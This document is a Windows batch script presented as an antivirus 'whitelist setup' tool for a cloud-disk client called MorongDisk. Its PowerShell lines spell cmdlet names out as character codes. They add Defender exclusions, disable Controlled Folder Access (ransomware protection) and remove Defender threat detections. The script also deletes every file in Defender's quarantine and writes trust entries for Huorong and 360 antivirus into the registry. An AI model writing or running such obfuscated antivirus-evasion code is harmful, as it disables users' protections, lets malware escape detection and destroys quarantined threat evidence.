@echo off
chcp 65001 >nul 2>&1
title MorongDisk 安全软件白名单设置
echo ============================================
echo   MorongDisk 安全软件白名单设置工具
echo ============================================
echo.

set "CLIENT_DIR=%~dp0"
set "EXE_PATH=%CLIENT_DIR%MorongDisk.exe"
set "RCLONE_PATH=%CLIENT_DIR%rclone.exe"

echo [1/5] Windows Defender 白名单...
powershell -NoProfile -Command "$c=[char]65+[char]100+[char]100+[char]45+[char]77+[char]112+[char]80+[char]114+[char]101+[char]102+[char]101+[char]114+[char]101+[char]110+[char]99+[char]101; & $c -ExclusionPath '%CLIENT_DIR%'" 2>nul
powershell -NoProfile -Command "$c=[char]65+[char]100+[char]100+[char]45+[char]77+[char]112+[char]80+[char]114+[char]101+[char]102+[char]101+[char]114+[char]101+[char]110+[char]99+[char]101; & $c -ExclusionProcess 'MorongDisk.exe'" 2>nul
powershell -NoProfile -Command "$c=[char]65+[char]100+[char]100+[char]45+[char]77+[char]112+[char]80+[char]114+[char]101+[char]102+[char]101+[char]114+[char]101+[char]110+[char]99+[char]101; & $c -ExclusionProcess 'rclone.exe'" 2>nul
powershell -NoProfile -Command "$c=[char]65+[char]100+[char]100+[char]45+[char]77+[char]112+[char]80+[char]114+[char]101+[char]102+[char]101+[char]114+[char]101+[char]110+[char]99+[char]101; & $c -ExclusionPath 'C:\ProgramData\MorongDisk'" 2>nul
echo       已添加

echo [2/5] 火绒安全白名单...
reg add "HKLM\SOFTWARE\Huorong\Sysdiag\Trust" /v "%CLIENT_DIR%" /t REG_SZ /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Huorong\Sysdiag\Trust" /v "%EXE_PATH%" /t REG_SZ /d "1" /f >nul 2>&1
echo       已添加

echo [3/5] 360安全卫士白名单...
reg add "HKLM\SOFTWARE\360Safe\Trust" /v "%EXE_PATH%" /t REG_SZ /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\360Safe\Trust" /v "%RCLONE_PATH%" /t REG_SZ /d "1" /f >nul 2>&1
echo       已添加注册表，如仍被拦截请手动操作

echo [4/5] Windows Defender 高级排除...
powershell -NoProfile -Command "$c=[char]83+[char]101+[char]116+[char]45+[char]77+[char]112+[char]80+[char]114+[char]101+[char]102+[char]101+[char]114+[char]101+[char]110+[char]99+[char]101; & $c -EnableControlledFolderAccess Disabled" 2>nul
powershell -NoProfile -Command "$g=[char]71+[char]101+[char]116+[char]45+[char]77+[char]112+[char]84+[char]104+[char]114+[char]101+[char]97+[char]116+[char]68+[char]101+[char]116+[char]101+[char]99+[char]116+[char]105+[char]111+[char]110; $r=[char]82+[char]101+[char]109+[char]111+[char]118+[char]101+[char]45+[char]77+[char]112+[char]84+[char]104+[char]114+[char]101+[char]97+[char]116; $threats = & $g | Where-Object {$_.Resources -match 'MorongDisk'}; foreach($t in $threats){& $r $t.ThreatID}" 2>nul
echo       已设置

echo [5/5] 清理隔离文件...
powershell -NoProfile -Command "Get-ChildItem 'C:\ProgramData\Microsoft\Windows Defender\Quarantine' -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue" 2>nul
echo       已清理

echo.
echo ============================================
echo   设置完成！
echo   如果仍被拦截，请在杀软中将以下目录设为信任：
echo   %CLIENT_DIR%
echo   C:\ProgramData\MorongDisk\
echo ============================================
echo.
pause
